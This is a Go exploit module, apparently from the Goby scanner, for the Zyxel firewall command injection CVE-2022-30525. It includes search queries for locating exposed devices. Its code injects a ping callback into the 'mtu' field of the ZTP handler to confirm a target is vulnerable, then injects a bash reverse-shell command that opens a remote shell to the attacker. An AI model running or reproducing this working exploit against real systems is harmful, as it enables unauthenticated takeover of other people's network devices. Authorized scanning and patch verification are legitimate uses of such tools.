package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Zyxel ZTP RCE (CVE-2022-30525)",
    "Description": "<p>Several firewalls, such as the Zyxel ATP series, VPN series, and USG FLEX series, have security vulnerabilities.</p><p>An unauthenticated remote attacker could execute arbitrary code on the affected device as the user nobody, taking control of the server.</p>",
    "Impact": "Zyxel ZTP RCE (CVE-2022-30525)",
    "Recommendation": "<p>At present, the manufacturer has released patches, please follow the link in time: <a href=\"https://www.zyxel.com/support/Zyxel-security-advisory-for-OS-command-injection-vulnerability-of-firewalls.shtml\">https://www.zyxel.com/support/Zyxel-security-advisory-for-OS-command-injection-vulnerability-of-firewalls.shtml</a></p>",
    "Product": "Zyxel",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Zyxel ZTP 远程命令执行漏洞（CVE-2022-30525）",
            "Description": "<p>Zyxel ATP 系列、VPN 系列和 USG FLEX 系列等多款防火墙存在安全漏洞。<br></p><p>未经身份验证的远程攻击者以nobody的用户身份在受影响设备上执行任意代码，控制服务器。<br></p>",
            "Impact": "<p>未经身份验证的远程攻击者以nobody的用户身份在受影响设备上执行任意代码，控制服务器。<br></p>",
            "Recommendation": "<p>目前厂商已发布补丁，请及时关注链接：<a href=\"https://www.zyxel.com/support/Zyxel-security-advisory-for-OS-command-injection-vulnerability-of-firewalls.shtml\">https://www.zyxel.com/support/Zyxel-security-advisory-for-OS-command-injection-vulnerability-of-firewalls.shtml</a><br></p>",
            "Product": "Zyxel",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Zyxel ZTP RCE (CVE-2022-30525)",
            "Description": "<p>Several firewalls, such as the Zyxel ATP series, VPN series, and USG FLEX series, have security vulnerabilities.<br></p><p>An unauthenticated remote attacker could execute arbitrary code on the affected device as the user nobody, taking control of the server.<br></p>",
            "Impact": "Zyxel ZTP RCE (CVE-2022-30525)",
            "Recommendation": "<p>At present, the manufacturer has released patches, please follow the link in time: <a href=\"https://www.zyxel.com/support/Zyxel-security-advisory-for-OS-command-injection-vulnerability-of-firewalls.shtml\">https://www.zyxel.com/support/Zyxel-security-advisory-for-OS-command-injection-vulnerability-of-firewalls.shtml</a><br></p>",
            "Product": "Zyxel",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "title=\"USG FLEX\" || title=\"USG20-VPN\" || title=\"USG20W-VPN\" || title=\"ATP100\" || title=\"ATP200\" || title=\"ATP500\"title=\"ATP700\" || title=\"ATP800\"",
    "GobyQuery": "title=\"USG FLEX\" || title=\"USG20-VPN\" || title=\"USG20W-VPN\" || title=\"ATP100\" || title=\"ATP200\" || title=\"ATP500\"title=\"ATP700\" || title=\"ATP800\"",
    "Author": "abszse",
    "Homepage": "https://www.zyxel.com/",
    "DisclosureDate": "2022-05-12",
    "References": [
        "https://www.rapid7.com/blog/post/2022/05/12/cve-2022-30525-fixed-zyxel-firewall-unauthenticated-remote-command-injection/?utm_source=dlvr.it&utm_medium=twitter"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2022-30525"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "goby_shell_linux",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10362"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			GodserverAddress, _ := godclient.GetGodCheckURL(checkStr)
			uri := "/ztp/cgi-bin/handler"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Data = fmt.Sprintf(`{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":"; ping %s;","data":"hi"}`, GodserverAddress)
			cfg.Header.Store("Content-Type", "application/json")
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			}
			return godclient.PullExists(checkStr, time.Second*15)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "goby_shell_linux" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					uri := "/ztp/cgi-bin/handler"
					cfg := httpclient.NewPostRequestConfig(uri)
					cfg.VerifyTls = false
					cfg.Data = fmt.Sprintf(`{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":"; bash -c \"exec %s ;\";","data":"hi"}`, godclient.ReverseTCPByBash(rp))
					cfg.Header.Store("Content-Type", "application/json")
					if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					}
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
				}
			}
			return expResult
		},
	))
}
